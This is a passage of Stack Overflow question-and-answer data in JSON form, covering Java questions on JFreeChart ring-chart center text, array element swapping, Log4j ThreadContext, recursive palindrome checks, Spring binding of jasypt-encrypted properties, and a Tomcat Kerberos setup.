dataset.setValue(&quot;Critical&quot;, Integer.valueOf(42));\n        dataset.setValue(&quot;Important&quot;, Integer.valueOf(21));\n        dataset.setValue(&quot;Moderate&quot;, Integer.valueOf(7));\n        dataset.setValue(&quot;Low&quot;, Integer.valueOf(3));\n        JFreeChart chart = ChartFactory.createRingChart(\n            &quot;Test&quot;, dataset, false, true, false);\n        RingPlot pie = (RingPlot) chart.getPlot();\n        pie.setSimpleLabels(true);\n        pie.setCenterTextMode(CenterTextMode.VALUE);\n        pie.setCenterTextFont(pie.getCenterTextFont().deriveFont(Font.BOLD, 30f));\n        pie.setCenterTextColor(Color.getHSBColor(0, 1, 1));\n        f.add(new ChartPanel(chart){\n            @Override\n            public Dimension getPreferredSize() {\n                return new Dimension(400, 400);\n            }\n        });\n        f.pack();\n        f.setLocationRelativeTo(null);\n        f.setVisible(true);\n    }\n\n    public static void main(String[] args) {\n        EventQueue.invokeLater(new TestRing()::display);\n    }\n}\n\n</code></pre>\n"}],"owner":{"account_id":4914505,"reputation":150,"user_id":4077701,"accept_rate":60,"display_name":"Vijay Raju"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":1009,"favorite_count":0,"down_vote_count":0,"up_vote_count":2,"accepted_answer_id":56672573,"answer_count":1,"score":2,"last_activity_date":1639574415,"creation_date":1560950158,"question_id":56668582,"body_markdown":"I am trying to generate a donut or ring chart using jfree chart library. Ringchart was generated successfully but only the problem is centered text inside ring was not displaying. The following is the sample snippet.\r\nchart generation code\r\n```java\r\nJFreeChart chart = ChartFactory.createRingChart(heading, dataSet, legend, tooltips, urls);\r\n```\r\nAnd centered text related code is like below\r\n```java\r\nRingPlot pie = (RingPlot) chart.getPlot();\r\npie.setBackgroundPaint(Color.WHITE);\r\npie.setOutlineVisible(false);\r\npie.setShadowPaint(null);\r\npie.setLabelGenerator(null);\r\npie.setCenterTextMode(CenterTextMode.VALUE);\r\nFont font = new Font(&quot;Arial&quot;,1,30);\r\npie.setCenterTextFont(font);\r\npie.setCenterTextColor(Color.getHSBColor(222, 1, 1));\r\npie.setSectionDepth(0.1);\r\npie.setSectionOutlinesVisible(false);\r\npie.setSeparatorsVisible(false);\r\npie.setIgnoreZeroValues(false);\r\n```\r\nI am using jfreechart verison 1.5.0","title":"Unable to display center text in ring chart","body":"<p>I am trying to generate a donut or ring chart using jfree chart library. Ringchart was generated successfully but only the problem is centered text inside ring was not displaying. The following is the sample snippet.\nchart generation code</p>\n\n<pre class=\"lang-java prettyprint-override\"><code>JFreeChart chart = ChartFactory.createRingChart(heading, dataSet, legend, tooltips, urls);\n</code></pre>\n\n<p>And centered text related code is like below</p>\n\n<pre class=\"lang-java prettyprint-override\"><code>RingPlot pie = (RingPlot) chart.getPlot();\npie.setBackgroundPaint(Color.WHITE);\npie.setOutlineVisible(false);\npie.setShadowPaint(null);\npie.setLabelGenerator(null);\npie.setCenterTextMode(CenterTextMode.VALUE);\nFont font = new Font(\"Arial\",1,30);\npie.setCenterTextFont(font);\npie.setCenterTextColor(Color.getHSBColor(222, 1, 1));\npie.setSectionDepth(0.1);\npie.setSectionOutlinesVisible(false);\npie.setSeparatorsVisible(false);\npie.setIgnoreZeroValues(false);\n</code></pre>\n\n<p>I am using jfreechart verison 1.5.0</p>\n"},{"tags":["java","arrays","swap"],"answers":[{"tags":[],"owner":{"account_id":14662905,"reputation":532,"user_id":10589536,"display_name":"anthony yaghi"},"down_vote_count":0,"up_vote_count":3,"is_accepted":true,"score":3,"last_activity_date":1563459068,"creation_date":1563459068,"answer_id":57096542,"question_id":57096439,"body_markdown":"Where is the code you tried so far ?!\r\n\r\nAnyway\r\n\r\n    for (int i = 0; i &lt; array.length; i += 2) {\r\n            if(i+1 &gt;= array.length) {\r\n                break;\r\n            }\r\n            int temp = array[i];\r\n            array[i] = array[i+1];\r\n            array[i+1] = temp;\r\n        }","title":"swap each element with its neighbour element in an array","body":"<p>Where is the code you tried so far ?!</p>\n\n<p>Anyway</p>\n\n<pre><code>for (int i = 0; i &lt; array.length; i += 2) {\n        if(i+1 &gt;= array.length) {\n            break;\n        }\n        int temp = array[i];\n        array[i] = array[i+1];\n        array[i+1] = temp;\n    }\n</code></pre>\n"},{"tags":[],"owner":{"account_id":13426653,"reputation":643,"user_id":9687785,"display_name":"omoshiroiii"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1563459185,"creation_date":1563459185,"answer_id":57096593,"question_id":57096439,"body_markdown":"\t\tint[] array ={111,77,88,44,32,11,13,25,44};\r\n\t\tint[] output = new int[array.length];\r\n\t\t\r\n\t\tfor(int x = 0; x &lt; array.length - 1; x += 2) {\r\n\t\t\toutput[x] = array[x + 1];\r\n\t\t\toutput[x+1] = array[x];\r\n\t\t}\r\n\t\tif(array.length % 2 != 0) {\r\n\t\t\toutput[output.length-1] = array[array.length-1];\r\n\t\t}\r\n\r\nYou just have to loop through the array, and populate the new array with the swapped values. ","title":"swap each element with its neighbour element in an array","body":"<pre><code>    int[] array ={111,77,88,44,32,11,13,25,44};\n    int[] output = new int[array.length];\n\n    for(int x = 0; x &lt; array.length - 1; x += 2) {\n        output[x] = array[x + 1];\n        output[x+1] = array[x];\n    }\n    if(array.length % 2 != 0) {\n        output[output.length-1] = array[array.length-1];\n    }\n</code></pre>\n\n<p>You just have to loop through the array, and populate the new array with the swapped values. </p>\n"},{"tags":[],"owner":{"account_id":11859204,"reputation":691,"user_id":8678385,"display_name":"A.Najafi"},"down_vote_count":2,"up_vote_count":1,"is_accepted":false,"score":-1,"last_activity_date":1563465986,"creation_date":1563459237,"answer_id":57096616,"question_id":57096439,"body_markdown":"first of all you have a function to swap the two elements like this:\r\n\r\n    public void swap(int [] array , int firstIndex , int secondIndex){\r\n        int temp = array[firstIndex];\r\n        array[firstIndex] = array[secondIndex];\r\n        array[secondIndex] = temp;\r\n     }\r\n    //Now it&#39;s time to navigate over the array like this:\r\n    \r\n    for(int i = 0 ; i &lt; array.length -1;i+=2){\r\n            swap(array,i,i+1);\r\n         }\r\n\r\n","title":"swap each element with its neighbour element in an array","body":"<p>first of all you have a function to swap the two elements like this:</p>\n\n<pre><code>public void swap(int [] array , int firstIndex , int secondIndex){\n    int temp = array[firstIndex];\n    array[firstIndex] = array[secondIndex];\n    array[secondIndex] = temp;\n }\n//Now it's time to navigate over the array like this:\n\nfor(int i = 0 ; i &lt; array.length -1;i+=2){\n        swap(array,i,i+1);\n     }\n</code></pre>\n"},{"tags":[],"owner":{"display_name":"user2902481"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1563459664,"creation_date":1563459664,"answer_id":57096747,"question_id":57096439,"body_markdown":"This should do the trick!\r\n\r\n    public static final &lt;T&gt; void swap (T[] a, int i, int j) {\r\n    T t = a[i];\r\n    a[i] = a[j];\r\n    a[j] = t;\r\n    }\r\n\r\n    public static final &lt;T&gt; void swap (List&lt;T&gt; l, int i, int j) {\r\n    Collections.&lt;T&gt;swap(l, i, j);\r\n    }\r\n\r\n    private void test() {\r\n    String [] a = {&quot;Hello&quot;, &quot;Goodbye&quot;};\r\n    swap(a, 0, 1);\r\n    System.out.println(&quot;a:&quot;+Arrays.toString(a));\r\n    List&lt;String&gt; l = new ArrayList&lt;String&gt;(Arrays.asList(a));\r\n    swap(l, 0, 1);\r\n    System.out.println(&quot;l:&quot;+l);\r\n    }\r\n\r\n","title":"swap each element with its neighbour element in an array","body":"<p>This should do the trick!</p>\n\n<pre><code>public static final &lt;T&gt; void swap (T[] a, int i, int j) {\nT t = a[i];\na[i] = a[j];\na[j] = t;\n}\n\npublic static final &lt;T&gt; void swap (List&lt;T&gt; l, int i, int j) {\nCollections.&lt;T&gt;swap(l, i, j);\n}\n\nprivate void test() {\nString [] a = {\"Hello\", \"Goodbye\"};\nswap(a, 0, 1);\nSystem.out.println(\"a:\"+Arrays.toString(a));\nList&lt;String&gt; l = new ArrayList&lt;String&gt;(Arrays.asList(a));\nswap(l, 0, 1);\nSystem.out.println(\"l:\"+l);\n}\n</code></pre>\n"}],"owner":{"account_id":16307867,"reputation":123,"user_id":11777369,"display_name":"Siddharth Khokhar"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":798,"favorite_count":0,"down_vote_count":1,"up_vote_count":1,"accepted_answer_id":57096542,"answer_count":4,"score":0,"last_activity_date":1639574120,"creation_date":1563458739,"question_id":57096439,"body_markdown":"I need to write a program. This method will take integer array as input and return array where each value is swapped with its neighbour element. In case the array has odd count, then last element is not swapped.\r\n\r\n    int[] array ={111,77,88,44,32,11,13,25,44}\r\nResult:\r\n```\r\n    finalarray= 77,111,44,88,11,32,25,13,44\r\n```\r\nI tried using nested for loops but didnt get it\r\n```\r\n\r\npublic static int[] swap(int array[]) {\r\n\t\tfor (int i = 1; i &lt; array.length; i++) {\r\n\t\t\tfor (int j = i; j &lt;= i; j++) {\r\n\t\t\t\tint temp = array[i - 1];\r\n\t\t\t\tarray[i - 1] = array[j];\r\n\t\t\t\tarray[j] = temp;\r\n\t\t\t}\r\n\r\n\t\t}\r\n\t\tfor (int k = 0; k &lt; array.length; k++) {\r\n\t\t\tSystem.out.print(array[k] + &quot; &quot;);\r\n\t\t}\r\n\r\n\t\t//Desired output 17,111,44,88,11,32,25,13,44\r\n\t\treturn array;\r\n\t}\r\n\r\n\tpublic static void main(String args[]) {\r\n\t\tint[] number = { 111, 17, 88, 44, 32, 11, 13, 25, 44 };\r\n\t\tnumber = swap(number);\r\n\r\n\t}\r\n","title":"swap each element with its neighbour element in an array","body":"<p>I need to write a program. This method will take integer array as input and return array where each value is swapped with its neighbour element. In case the array has odd count, then last element is not swapped.</p>\n\n<pre><code>int[] array ={111,77,88,44,32,11,13,25,44}\n</code></pre>\n\n<p>Result:</p>\n\n<pre><code>    finalarray= 77,111,44,88,11,32,25,13,44\n</code></pre>\n\n<p>I tried using nested for loops but didnt get it</p>\n\n<pre><code>\npublic static int[] swap(int array[]) {\n        for (int i = 1; i &lt; array.length; i++) {\n            for (int j = i; j &lt;= i; j++) {\n                int temp = array[i - 1];\n                array[i - 1] = array[j];\n                array[j] = temp;\n            }\n\n        }\n        for (int k = 0; k &lt; array.length; k++) {\n            System.out.print(array[k] + \" \");\n        }\n\n        //Desired output 17,111,44,88,11,32,25,13,44\n        return array;\n    }\n\n    public static void main(String args[]) {\n        int[] number = { 111, 17, 88, 44, 32, 11, 13, 25, 44 };\n        number = swap(number);\n\n    }\n\n</code></pre>\n"},{"tags":["java","log4j"],"answers":[{"tags":[],"owner":{"account_id":1063012,"reputation":71986,"user_id":1064245,"accept_rate":82,"display_name":"M A"},"down_vote_count":0,"up_vote_count":1,"is_accepted":true,"score":1,"last_activity_date":1639574111,"creation_date":1639574111,"answer_id":70364350,"question_id":70364111,"body_markdown":"As per https://svn.apache.org/viewvc?view=revision&amp;revision=1594389, the `clear()` method is replaced with `clearMap()` (it was already deprecated when it was removed).","title":"Log4j ThreadContext.clear() not available with auto-complete?","body":"<p>As per <a href=\"https://svn.apache.org/viewvc?view=revision&amp;revision=1594389\" rel=\"nofollow noreferrer\">https://svn.apache.org/viewvc?view=revision&amp;revision=1594389</a>, the <code>clear()</code> method is replaced with <code>clearMap()</code> (it was already deprecated when it was removed).</p>\n"}],"owner":{"account_id":146387,"reputation":4170,"user_id":356815,"accept_rate":74,"display_name":"basZero"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":417,"favorite_count":0,"down_vote_count":0,"up_vote_count":1,"accepted_answer_id":70364350,"answer_count":1,"score":1,"last_activity_date":1639574111,"creation_date":1639573108,"question_id":70364111,"body_markdown":"according to the [Log4j documentation][1] I can call \r\n\r\n`ThreadContext.clear();`\r\n\r\nbut in my IDE I do not get `clear()` as an available method and I also get compilation errors, I only see clearAll(), etc., why? What is missing on the classpath?\r\n\r\nLog4j Version 2.16.0 is used.\r\n\r\n[![enter image description here][2]][2]\r\n\r\n\r\n  [1]: https://logging.apache.org/log4j/2.x/manual/thread-context.html\r\n  [2]: https://i.stack.imgur.com/oclar.png","title":"Log4j ThreadContext.clear() not available with auto-complete?","body":"<p>according to the <a href=\"https://logging.apache.org/log4j/2.x/manual/thread-context.html\" rel=\"nofollow noreferrer\">Log4j documentation</a> I can call</p>\n<p><code>ThreadContext.clear();</code></p>\n<p>but in my IDE I do not get <code>clear()</code> as an available method and I also get compilation errors, I only see clearAll(), etc., why? What is missing on the classpath?</p>\n<p>Log4j Version 2.16.0 is used.</p>\n<p><a href=\"https://i.stack.imgur.com/oclar.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/oclar.png\" alt=\"enter image description here\" /></a></p>\n"},{"tags":["java"],"comments":[{"owner":{"account_id":9061711,"reputation":1055,"user_id":6748042,"display_name":"Victor Polo De Gyves Montero"},"score":1,"creation_date":1582008030,"post_id":60275100,"comment_id":106617495,"body_markdown":"Why you need a recursive method for this? It&#39;s as simple as to split the string by half, then take the second half, reverse it and compare.","body":"Why you need a recursive method for this? It&#39;s as simple as to split the string by half, then take the second half, reverse it and compare."},{"owner":{"account_id":3557625,"reputation":198996,"user_id":2970947,"display_name":"Elliott Frisch"},"score":1,"creation_date":1582008098,"post_id":60275100,"comment_id":106617525,"body_markdown":"@Victor Or just iterate the first half, and test that each character matches the corresponding index (offset from the length) on the right hand side.","body":"@Victor Or just iterate the first half, and test that each character matches the corresponding index (offset from the length) on the right hand side."},{"owner":{"account_id":9061711,"reputation":1055,"user_id":6748042,"display_name":"Victor Polo De Gyves Montero"},"score":0,"creation_date":1582008354,"post_id":60275100,"comment_id":106617607,"body_markdown":"@ElliottFrisch or just iterate the first half of chars,  XOR-them, iterate the second half, XOR-them and compare! as fast as binary comparison!","body":"@ElliottFrisch or just iterate the first half of chars,  XOR-them, iterate the second half, XOR-them and compare! as fast as binary comparison!"},{"owner":{"account_id":31180,"reputation":29173,"user_id":85421,"display_name":"user85421"},"score":0,"creation_date":1582009707,"post_id":60275100,"comment_id":106618116,"body_markdown":"@Victor AFAIK `XOR` would not work - does is consider order? (`&quot;abab&quot;` is not a palindrome) | lot of values will create same XOR value (e.g.  `&#39;a&#39; ^ &#39;g&#39; == &#39;b&#39; ^ d&#39; == &#39;c&#39; ^ &#39;e&#39;`)","body":"@Victor AFAIK <code>XOR</code> would not work - does is consider order? (<code>&quot;abab&quot;</code> is not a palindrome) | lot of values will create same XOR value (e.g.  <code>&#39;a&#39; ^ &#39;g&#39; == &#39;b&#39; ^ d&#39; == &#39;c&#39; ^ &#39;e&#39;</code>)"},{"owner":{"account_id":12583055,"reputation":447,"user_id":9732672,"display_name":"NomadMaker"},"score":0,"creation_date":1582011649,"post_id":60275100,"comment_id":106618954,"body_markdown":"Or just reverse the string and check if it&#39;s equal to the original. Though best to compare without case.","body":"Or just reverse the string and check if it&#39;s equal to the original. Though best to compare without case."}],"answers":[{"tags":[],"owner":{"account_id":4158688,"reputation":2520,"user_id":3409234,"display_name":"TanvirChowdhury"},"down_vote_count":0,"up_vote_count":1,"is_accepted":true,"score":1,"last_activity_date":1582008686,"creation_date":1582008095,"answer_id":60275167,"question_id":60275100,"body_markdown":"try this method please \r\n\r\n    public static boolean isPal(String s)\r\n    {\r\n        if(s.length() == 0 || s.length() == 1) {\r\n            return true;\r\n        }\r\n        if(s.charAt(0) == s.charAt(s.length()-1)) {\r\n    \r\n            return isPal(s.substring(1, s.length() - 1));\r\n        }\r\n        return false;\r\n    }","title":"recursive method that checks if a string is palindrome in java","body":"<p>try this method please </p>\n\n<pre><code>public static boolean isPal(String s)\n{\n    if(s.length() == 0 || s.length() == 1) {\n        return true;\n    }\n    if(s.charAt(0) == s.charAt(s.length()-1)) {\n\n        return isPal(s.substring(1, s.length() - 1));\n    }\n    return false;\n}\n</code></pre>\n"},{"tags":[],"owner":{"account_id":3557625,"reputation":198996,"user_id":2970947,"display_name":"Elliott Frisch"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1582008510,"creation_date":1582008510,"answer_id":60275258,"question_id":60275100,"body_markdown":"First, I would create a helped method with that recursive signature (the public function should just take a `String`). And we can test for `null` and the empty string as special cases there. Like,\r\n\r\n\tpublic static boolean isPalindrome(String x) {\r\n\t\tif (x == null) {\r\n\t\t\treturn false;\r\n\t\t} else if (x.isEmpty()) {\r\n\t\t\treturn true;\r\n\t\t}\r\n\t\treturn isPalindrome(x, 0);\r\n\t}\r\n\r\nThen your current method seems close, but you want to compare `n` with a less than operator to the half of the length of `x`. Then test that the character matches on the right hand side (offset by `n` from `x.length()` but we need a `-1` because of zero based indexing). Also, the method should return a `boolean` (and I fixed the name). Like\r\n\r\n\tprivate static boolean isPalindrome(String x, int n) {\r\n\t\tif (n &lt; x.length() / 2) {\r\n\t\t\tif (x.charAt(n) != x.charAt(x.length() - n - 1)) {\r\n\t\t\t\treturn false;\r\n\t\t\t}\r\n\t\t\treturn isPalindrome(x, n + 1);\r\n\t\t}\r\n\t\treturn true;\r\n\t}","title":"recursive method that checks if a string is palindrome in java","body":"<p>First, I would create a helped method with that recursive signature (the public function should just take a <code>String</code>). And we can test for <code>null</code> and the empty string as special cases there. Like,</p>\n\n<pre><code>public static boolean isPalindrome(String x) {\n    if (x == null) {\n        return false;\n    } else if (x.isEmpty()) {\n        return true;\n    }\n    return isPalindrome(x, 0);\n}\n</code></pre>\n\n<p>Then your current method seems close, but you want to compare <code>n</code> with a less than operator to the half of the length of <code>x</code>. Then test that the character matches on the right hand side (offset by <code>n</code> from <code>x.length()</code> but we need a <code>-1</code> because of zero based indexing). Also, the method should return a <code>boolean</code> (and I fixed the name). Like</p>\n\n<pre><code>private static boolean isPalindrome(String x, int n) {\n    if (n &lt; x.length() / 2) {\n        if (x.charAt(n) != x.charAt(x.length() - n - 1)) {\n            return false;\n        }\n        return isPalindrome(x, n + 1);\n    }\n    return true;\n}\n</code></pre>\n"},{"tags":[],"owner":{"account_id":20016172,"reputation":2513,"user_id":14672114,"display_name":"RARE Kpop Manifesto"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1639574102,"creation_date":1639574102,"answer_id":70364348,"question_id":60275100,"body_markdown":"i&#39;d first do 2 or 3 quick checks :\r\n\r\n1. if first character fail to match the last. that&#39;s a huge time saver without having to reverse anything, esp when input is really long\r\n\r\n2. then ask it to locate any character that *isn&#39;t* the same as the first. if not, the string already is a nonstop-chain of that same character, then it must be a palindrome.\r\n\r\n3. (optional one) if input is REALLY REALLY long, quick check on distribution of components of just that same first character - by definition of a palindrome, \r\n\r\nif length is even then # of occurrences of that char *must* also be even. \r\n\r\nif length is odd, then it should be even unless the exactly-center character is also that same one, otherwise you&#39;ll know the distribution is already not-balanced between left and right, then what&#39;s the point of reversing it when u can return false at this point and save time.\r\n\r\n\r\nif both passes, then do what others have suggested : reverse the right-side half and check if it lines up with left-most index position (0 or 1 depending on which langauge). The reversal part doesn&#39;t have to do any of these small checks. just reverse it at high speed.\r\n\r\n","title":"recursive method that checks if a string is palindrome in java","body":"<p>i'd first do 2 or 3 quick checks :</p>\n<ol>\n<li><p>if first character fail to match the last. that's a huge time saver without having to reverse anything, esp when input is really long</p>\n</li>\n<li><p>then ask it to locate any character that <em>isn't</em> the same as the first. if not, the string already is a nonstop-chain of that same character, then it must be a palindrome.</p>\n</li>\n<li><p>(optional one) if input is REALLY REALLY long, quick check on distribution of components of just that same first character - by definition of a palindrome,</p>\n</li>\n</ol>\n<p>if length is even then # of occurrences of that char <em>must</em> also be even.</p>\n<p>if length is odd, then it should be even unless the exactly-center character is also that same one, otherwise you'll know the distribution is already not-balanced between left and right, then what's the point of reversing it when u can return false at this point and save time.</p>\n<p>if both passes, then do what others have suggested : reverse the right-side half and check if it lines up with left-most index position (0 or 1 depending on which langauge). The reversal part doesn't have to do any of these small checks. just reverse it at high speed.</p>\n"}],"owner":{"account_id":17657848,"reputation":13,"user_id":12816996,"display_name":"mohamed mohsen"},"comment_count":5,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":381,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"accepted_answer_id":60275167,"answer_count":3,"score":0,"last_activity_date":1639574102,"creation_date":1582007790,"question_id":60275100,"body_markdown":"**the input**: &quot;mnkknm&quot; where n=0\r\n**the output**: flag is always equal 1 while it should be equal 3\r\nand it returns -1 \r\nwhat is the problem ?\r\nnote : palindrome means for example if the Reverse of malayalam is also\r\nmalayalam then its palindrome\r\nanother note : i should write the code recursive as it&#39;s a homework\r\n```\r\npublic static int PalindromeCheck(String x , int n) \r\n{\r\n\r\nint flag =0;\r\nif (n+1 !=x.length()/2)\r\n{\r\nchar s = x.charAt(n);\r\nchar y = x.charAt(x.length()-1-n);\r\nif (s==y)\r\n{    flag++;\r\nSystem.out.println(flag); // i write it to check the value of the flag\r\n}\r\n\r\nreturn  flag+PalindromeCheck(x,n+1) ;\r\n}\r\n\r\nif (flag==x.length()/2)\r\n{\r\nreturn 1;}\r\nelse{\r\nreturn -1;\r\n}\r\n```\r\n","title":"recursive method that checks if a string is palindrome in java","body":"<p><strong>the input</strong>: \"mnkknm\" where n=0\n<strong>the output</strong>: flag is always equal 1 while it should be equal 3\nand it returns -1 \nwhat is the problem ?\nnote : palindrome means for example if the Reverse of malayalam is also\nmalayalam then its palindrome\nanother note : i should write the code recursive as it's a homework</p>\n\n<pre><code>public static int PalindromeCheck(String x , int n) \n{\n\nint flag =0;\nif (n+1 !=x.length()/2)\n{\nchar s = x.charAt(n);\nchar y = x.charAt(x.length()-1-n);\nif (s==y)\n{    flag++;\nSystem.out.println(flag); // i write it to check the value of the flag\n}\n\nreturn  flag+PalindromeCheck(x,n+1) ;\n}\n\nif (flag==x.length()/2)\n{\nreturn 1;}\nelse{\nreturn -1;\n}\n</code></pre>\n"},{"tags":["java","spring","encryption","jasypt"],"comments":[{"owner":{"account_id":3192259,"reputation":117609,"user_id":2696260,"display_name":"M. Deinum"},"score":0,"creation_date":1639574732,"post_id":70364299,"comment_id":124382936,"body_markdown":"Not really as the encryption is also done by a post processor, it actually post processes the environment and wraps the property sources. So you have kind of a chicken/egg problem. But why this code in the firs tplace? The `@ConfigurationProperties` are already supported out-of-the-box so why the post processor in the first place?","body":"Not really as the encryption is also done by a post processor, it actually post processes the environment and wraps the property sources. So you have kind of a chicken/egg problem. But why this code in the firs tplace? The <code>@ConfigurationProperties</code> are already supported out-of-the-box so why the post processor in the first place?"},{"owner":{"account_id":16379082,"reputation":355,"user_id":11830541,"display_name":"Serhii Kachan"},"score":0,"creation_date":1639580795,"post_id":70364299,"comment_id":124385809,"body_markdown":"I&#39;m trying to create bunch of JwtClientConfig beans dynamically, so I dont need any explicitly declared @ConfigurationProperties beans. Just trying to code less","body":"I&#39;m trying to create bunch of JwtClientConfig beans dynamically, so I dont need any explicitly declared @ConfigurationProperties beans. Just trying to code less"}],"owner":{"account_id":16379082,"reputation":355,"user_id":11830541,"display_name":"Serhii Kachan"},"comment_count":2,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":246,"favorite_count":0,"down_vote_count":0,"up_vote_count":1,"answer_count":0,"score":1,"last_activity_date":1639573879,"creation_date":1639573879,"question_id":70364299,"body_markdown":"I&#39;ve registered a Spring Post Processor to register some beans based on application properties.\r\nAlso I would like to add support for encrypted properties.\r\n\r\nI use **spring** and **jasypt spring boot**\r\n\r\nHere are my configurations:\r\n\r\napplication.yml:\r\n\r\n    rest:\r\n      jwt-client:\r\n        location:\r\n          base-url: loc_URL\r\n          invoke-timeout:\r\n            connection: 5000\r\n            read: 500\r\n          jwt-config:\r\n            token: ENC(gRbmO8Gv2Yb3vUf27nykDPd5/wjVdj+r5REr5HcIh4k=)\r\n\r\nPost Processor class:\r\n\r\n    @RequiredArgsConstructor\r\n    public class DynamicClientBeanConfiguration implements BeanDefinitionRegistryPostProcessor {\r\n\r\n        private static final String BEAN_POSTFIX = &quot;-api-client-config&quot;;\r\n        private final Environment environment;\r\n\r\n        @Override\r\n        public void postProcessBeanDefinitionRegistry(@NonNull BeanDefinitionRegistry registry) {\r\n            Binder.get(environment)\r\n                    .bind(&quot;rest.jwt-client&quot;, Bindable.mapOf(String.class, JwtClientConfig.class))\r\n                    .orElse(new LinkedHashMap&lt;&gt;())\r\n                    .forEach((key, value) -&gt; {\r\n                        GenericBeanDefinition bd = new GenericBeanDefinition();\r\n                        bd.setBeanClass(JwtClientConfig.class);\r\n                        bd.setInstanceSupplier(() -&gt; value);\r\n                        bd.addQualifier(new AutowireCandidateQualifier(key + BEAN_POSTFIX));\r\n                        registry.registerBeanDefinition(key + BEAN_POSTFIX, bd);\r\n                        log.debug(&quot;Registered JwtClientConfig bean with @Qualifier(\\&quot;{}\\&quot;)&quot;, key + BEAN_POSTFIX);\r\n                    });\r\n        }\r\n\r\n        @Override\r\n        public void postProcessBeanFactory(@NonNull ConfigurableListableBeanFactory beanFactory) {\r\n            // Nothing to override\r\n        }\r\n    }\r\n\r\nCustom Configuration Properties class:\r\n\r\n    @Getter\r\n    @Setter\r\n    @ConfigurationProperties\r\n    public class JwtClientConfig {\r\n        private String baseUrl;\r\n        private InvokeTimeout invokeTimeout;\r\n        private JwtConfig jwtConfig;\r\n\r\n        @Getter\r\n        @Setter\r\n        public static class InvokeTimeout {\r\n            private int connection;\r\n            private int read;\r\n        }\r\n\r\n        @Getter\r\n        @Setter\r\n        public static class JwtConfig {\r\n            private String token;\r\n        }\r\n    }\r\n\r\nHowever when the following part of code in the post processor executed it binds raw data from properties like ENC(...) but not decrypted as I expect:\r\n\r\n    Binder.get(environment)\r\n          .bind(&quot;rest.jwt-client&quot;, Bindable.mapOf(String.class, JwtClientConfig.class))\r\n          .orElse(new LinkedHashMap&lt;&gt;())\r\n\r\nIt it possible to bind already decrypted properties in Post Processor?","title":"BeanDefinitionRegistryPostProcessor ignores Encrypted properties","body":"<p>I've registered a Spring Post Processor to register some beans based on application properties.\nAlso I would like to add support for encrypted properties.</p>\n<p>I use <strong>spring</strong> and <strong>jasypt spring boot</strong></p>\n<p>Here are my configurations:</p>\n<p>application.yml:</p>\n<pre><code>rest:\n  jwt-client:\n    location:\n      base-url: loc_URL\n      invoke-timeout:\n        connection: 5000\n        read: 500\n      jwt-config:\n        token: ENC(gRbmO8Gv2Yb3vUf27nykDPd5/wjVdj+r5REr5HcIh4k=)\n</code></pre>\n<p>Post Processor class:</p>\n<pre><code>@RequiredArgsConstructor\npublic class DynamicClientBeanConfiguration implements BeanDefinitionRegistryPostProcessor {\n\n    private static final String BEAN_POSTFIX = &quot;-api-client-config&quot;;\n    private final Environment environment;\n\n    @Override\n    public void postProcessBeanDefinitionRegistry(@NonNull BeanDefinitionRegistry registry) {\n        Binder.get(environment)\n                .bind(&quot;rest.jwt-client&quot;, Bindable.mapOf(String.class, JwtClientConfig.class))\n                .orElse(new LinkedHashMap&lt;&gt;())\n                .forEach((key, value) -&gt; {\n                    GenericBeanDefinition bd = new GenericBeanDefinition();\n                    bd.setBeanClass(JwtClientConfig.class);\n                    bd.setInstanceSupplier(() -&gt; value);\n                    bd.addQualifier(new AutowireCandidateQualifier(key + BEAN_POSTFIX));\n                    registry.registerBeanDefinition(key + BEAN_POSTFIX, bd);\n                    log.debug(&quot;Registered JwtClientConfig bean with @Qualifier(\\&quot;{}\\&quot;)&quot;, key + BEAN_POSTFIX);\n                });\n    }\n\n    @Override\n    public void postProcessBeanFactory(@NonNull ConfigurableListableBeanFactory beanFactory) {\n        // Nothing to override\n    }\n}\n</code></pre>\n<p>Custom Configuration Properties class:</p>\n<pre><code>@Getter\n@Setter\n@ConfigurationProperties\npublic class JwtClientConfig {\n    private String baseUrl;\n    private InvokeTimeout invokeTimeout;\n    private JwtConfig jwtConfig;\n\n    @Getter\n    @Setter\n    public static class InvokeTimeout {\n        private int connection;\n        private int read;\n    }\n\n    @Getter\n    @Setter\n    public static class JwtConfig {\n        private String token;\n    }\n}\n</code></pre>\n<p>However when the following part of code in the post processor executed it binds raw data from properties like ENC(...) but not decrypted as I expect:</p>\n<pre><code>Binder.get(environment)\n      .bind(&quot;rest.jwt-client&quot;, Bindable.mapOf(String.class, JwtClientConfig.class))\n      .orElse(new LinkedHashMap&lt;&gt;())\n</code></pre>\n<p>It it possible to bind already decrypted properties in Post Processor?</p>\n"},{"tags":["java","tomcat","kerberos","spnego"],"answers":[{"tags":[],"owner":{"account_id":4048595,"reputation":589,"user_id":3329032,"display_name":"Ben Goldin"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1450188206,"creation_date":1450188206,"answer_id":34291223,"question_id":34291046,"body_markdown":"Have you replaced your security policy files with the Unlimited Strength Jurisdiction Policy Files for Java?\r\n\r\nhttp://www.oracle.com/technetwork/java/javase/downloads/jce8-download-2133166.html","title":"krb5.conf file ignored by tomcat","body":"<p>Have you replaced your security policy files with the Unlimited Strength Jurisdiction Policy Files for Java?</p>\n\n<p><a href=\"http://www.oracle.com/technetwork/java/javase/downloads/jce8-download-2133166.html\" rel=\"nofollow\">http://www.oracle.com/technetwork/java/javase/downloads/jce8-download-2133166.html</a></p>\n"}],"owner":{"account_id":3930600,"reputation":249,"user_id":3249353,"accept_rate":50,"display_name":"user3249353"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":683,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":1,"score":0,"last_activity_date":1639573782,"creation_date":1450187716,"question_id":34291046,"body_markdown":"I am trying to setup kerberos/spnego authentication 